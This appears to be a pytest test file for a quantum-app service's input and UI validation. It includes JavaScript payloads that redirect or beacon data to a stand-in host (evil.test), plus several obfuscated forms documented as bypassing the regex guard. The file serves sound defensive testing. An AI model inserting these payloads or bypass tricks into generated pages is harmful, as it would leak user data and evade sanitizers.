import datetime as dt
from types import SimpleNamespace
import uuid

import pytest
from majorana_contracts import PublicQapp

from majorana_api.auth import qapp_deps
from majorana_api.qapp_validation import (
    normalize_qapp_schema,
    validate_qapp_inputs,
    validate_qapp_ui_document,
)
from majorana_api.repos.qapps import _slug
from majorana_api.routes.qapps import list_public_qapps
from majorana_api.routes.runs import CreateRunRequest


SCHEMA = {
    "type": "object",
    "properties": {
        "qubits": {"type": "integer", "minimum": 2, "maximum": 8},
        "label": {"type": "string", "maxLength": 40},
    },
    "required": ["qubits"],
    "additionalProperties": False,
}


def test_qapp_is_an_explicit_run_mode():
    request = CreateRunRequest(task_prompt="build an app", mode="qapp")
    assert request.mode.value == "qapp"


def test_qapp_slug_keeps_uuid_bits_that_differ_within_one_timestamp():
    first = uuid.UUID("01a03280-032d-7fe5-b424-247126d8315f")
    second = uuid.UUID("01a03280-0d85-7425-aa26-523de71fabc4")

    assert _slug("Bell explorer", first) != _slug("Bell explorer", second)
    assert _slug("Bell explorer", first).endswith(first.hex)


def test_qapp_input_schema_is_bounded_and_enforced():
    assert normalize_qapp_schema(SCHEMA)["additionalProperties"] is False
    validate_qapp_inputs(SCHEMA, {"qubits": 4, "label": "GHZ"})
    with pytest.raises(ValueError, match="minimum"):
        validate_qapp_inputs(SCHEMA, {"qubits": 1})
    with pytest.raises(ValueError, match="undeclared"):
        validate_qapp_inputs(SCHEMA, {"qubits": 4, "surprise": True})


def test_qapp_schema_rejects_nested_objects_and_unbounded_arrays():
    with pytest.raises(ValueError, match="unsupported type"):
        normalize_qapp_schema({"type": "object", "properties": {"nested": {"type": "object"}}})
    with pytest.raises(ValueError, match="100-item"):
        normalize_qapp_schema(
            {
                "type": "object",
                "properties": {
                    "values": {
                        "type": "array",
                        "items": {"type": "number"},
                        "maxItems": 101,
                    }
                },
            }
        )

    with pytest.raises(ValueError, match="additionalProperties"):
        normalize_qapp_schema(
            {
                "type": "object",
                "properties": {
                    "counts": {
                        "type": "object",
                        "additionalProperties": {"type": "integer"},
                    }
                },
            }
        )


def test_qapp_ui_guard_accepts_an_inline_capability_only_app():
    validate_qapp_ui_document(
        "<!doctype html><html><body><button type='button'>Run</button>"
        "<script>const history=[1,2];history.forEach(draw);"
        "button.onclick=async()=>{const result=await window.qapp.run({shots:100})}</script>"
        "</body></html>"
    )


@pytest.mark.parametrize(
    "document",
    [
        "<script>fetch('/secret')</script>",
        "<a href='https://example.test'>leave</a><script>void 0</script>",
        "<script>window.location='https://example.test'</script>",
        "<script>history.pushState({},'', '/elsewhere')</script>",
        "<script>location.assign('/elsewhere')</script>",
        "<script>localStorage.setItem('x','y')</script>",
        "<style>body{background:url(https://example.test/x)}</style><script>void 0</script>",
    ],
)
def test_qapp_ui_guard_rejects_direct_browser_capabilities(document):
    with pytest.raises(ValueError, match="forbidden"):
        validate_qapp_ui_document(document)


def test_public_qapp_contract_cannot_expose_quantum_source_or_tenant_ids():
    assert "quantum_source" not in PublicQapp.model_fields
    assert "workspace_id" not in PublicQapp.model_fields
    resource = PublicQapp(
        slug="bell-demo-12345678",
        title="Bell explorer",
        description="Explore Bell correlations",
        framework="qiskit",
        qubits_estimate=2,
        ui_document="<html></html>",
        input_schema={"type": "object"},
        output_schema={"type": "object"},
        version=1,
        fingerprint="a" * 64,
        published_at=dt.datetime.now(dt.timezone.utc),
    )
    assert "quantum_source" not in resource.model_dump()


async def test_public_qapp_scope_arms_the_anonymous_rls_context(monkeypatch):
    captured = {}

    async def set_context(session, scope, *, enforce):
        captured.update(session=session, scope=scope, enforce=enforce)

    monkeypatch.setattr(qapp_deps, "set_rls_context", set_context)
    session = object()
    scope = await qapp_deps.get_public_qapp_scope(
        session,
        SimpleNamespace(rls_enforced=True),
    )

    assert scope.workspace_id.int == 0 and scope.user_id.int == 0
    assert captured == {"session": session, "scope": scope, "enforce": True}


async def test_public_qapp_listing_returns_only_gallery_safe_metadata(monkeypatch):
    now = dt.datetime.now(dt.timezone.utc)
    qapp = SimpleNamespace(
        slug="h2-energy-123",
        title="H₂ ground-state explorer",
        description="Explore the H₂ energy curve",
        published_at=now,
        workspace_id=uuid.uuid4(),
        owner_user_id=uuid.uuid4(),
    )
    version = SimpleNamespace(
        framework="qiskit",
        qubits_estimate=4,
        seq=2,
        quantum_source="must not cross the gallery boundary",
        ui_document="<html>large generated app</html>",
    )

    async def rows(scope, session):
        return [(qapp, version)]

    monkeypatch.setattr("majorana_api.routes.qapps.qapps_repo.list_public_qapps", rows)
    result = await list_public_qapps(SimpleNamespace(), object())
    dumped = result[0].model_dump()

    assert dumped == {
        "slug": "h2-energy-123",
        "title": "H₂ ground-state explorer",
        "description": "Explore the H₂ energy curve",
        "framework": "qiskit",
        "qubits_estimate": 4,
        "version": 2,
        "published_at": now,
    }
    assert "workspace_id" not in dumped
    assert "owner_user_id" not in dumped
    assert "quantum_source" not in dumped
    assert "ui_document" not in dumped


#: Navigation payloads, measured against `_FORBIDDEN_UI_PATTERNS`. The split is
#: the point and is asserted rather than described: `BLOCKED_UI_PAYLOADS` are
#: the ones the pattern list catches, `UNBLOCKED_UI_PAYLOADS` the ones it
#: provably cannot, because they never spell the API they call. Pinning the
#: second list is not defeatism — it is the only way the claim in
#: `validate_qapp_ui_document`'s docstring stays honest. If someone later adds a
#: rule that catches one of these, this test fails and tells them to move it up
#: and update the docstring, instead of leaving a stale "regexes cannot do this"
#: comment above a list that now can.
BLOCKED_UI_PAYLOADS = {
    "plain location.href": '<script>location.href="https://evil.test/?d="+x</script>',
    "self.location": '<script>self.location="https://evil.test/?d="+x</script>',
    "with(window)": '<script>with(window){location="https://evil.test"}</script>',
    "Function constructor": "<script>Function(\"l\",\"l.href='https://evil.test'\")(location)</script>",
    "atob-built property": '<script>window[atob("bG9jYXRpb24=")]=x</script>',
    "setAttribute on a built anchor": (
        '<script>const a=document.createElement("a");'
        'a.setAttribute("hr"+"ef","https://evil.test");a.click()</script>'
    ),
    "scripted form submit": (
        '<script>const f=document.createElement("form");'
        'f.setAttribute("acti"+"on","https://evil.test");document.body.append(f);f.submit()</script>'
    ),
    "meta refresh built in script": (
        '<script>const m=document.createElement("meta");m.httpEquiv="refresh";'
        'm.content="0;url=https://evil.test";document.head.append(m)</script>'
    ),
    "anchor spliced into a template string": (
        '<script>document.body.innerHTML=`<a hr${""}ef="https://evil.test">go</a>`</script>'
    ),
    "Image().src beacon": '<script>const i=new Image();i.src="https://evil.test/?d="+x</script>',
    "eval of an encoded payload": (
        '<script>eval(atob("bG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9ldmlsLnRlc3Qi"))</script>'
    ),
}

UNBLOCKED_UI_PAYLOADS = {
    "computed member access": '<script>window["loc"+"ation"]["hre"+"f"]="https://evil.test"</script>',
    "destructured assign": '<script>const{assign:a}=self.location;a("https://evil.test")</script>',
    "globalThis computed": '<script>globalThis["location"]["assign"]("https://evil.test")</script>',
}

#: Documents an honest generator plausibly emits. A false positive here is not
#: cosmetic: a rejection sends the generation back for a `ui` repair, which is
#: another paid model call on every ordinary Qapp.
LEGITIMATE_UI_DOCUMENTS = {
    "ordinary generated UI": (
        '<h1>Bell</h1><input id="n"><button id="go">Run</button><div id="out"></div>'
        "<script>go.onclick=async()=>{const r=await window.qapp.run({qubits:Number(n.value)});"
        'document.getElementById("out").textContent=JSON.stringify(r);}</script>'
    ),
    "canvas chart": (
        '<canvas id="c"></canvas><script>const ctx=document.getElementById("c")'
        '.getContext("2d");ctx.fillRect(0,0,10,10);</script>'
    ),
    "aria label on a built list item": (
        '<div id="r"></div><script>const li=document.createElement("li");'
        'li.setAttribute("aria-label","bar");document.getElementById("r").append(li);</script>'
    ),
    "styled results table": (
        '<style>td{padding:4px}</style><table id="t"></table>'
        '<script>t.innerHTML="<tr><td>0.5</td></tr>";</script>'
    ),
}


@pytest.mark.parametrize("name", sorted(BLOCKED_UI_PAYLOADS))
def test_ui_guard_rejects_assembled_navigation(name):
    with pytest.raises(ValueError):
        validate_qapp_ui_document(BLOCKED_UI_PAYLOADS[name])


@pytest.mark.parametrize("name", sorted(UNBLOCKED_UI_PAYLOADS))
def test_ui_guard_provably_cannot_catch_concatenated_location_access(name):
    """The documented hole, asserted so the documentation cannot go stale.

    These reach a reader, and `qapp-runtime.tsx`'s navigation tripwire — not
    this function — is what stops them. If this test starts failing because a
    new pattern catches one, that is good news: move it into
    `BLOCKED_UI_PAYLOADS` and correct the docstring's count.
    """
    validate_qapp_ui_document(UNBLOCKED_UI_PAYLOADS[name])


@pytest.mark.parametrize("name", sorted(LEGITIMATE_UI_DOCUMENTS))
def test_ui_guard_accepts_documents_an_honest_generator_emits(name):
    validate_qapp_ui_document(LEGITIMATE_UI_DOCUMENTS[name])
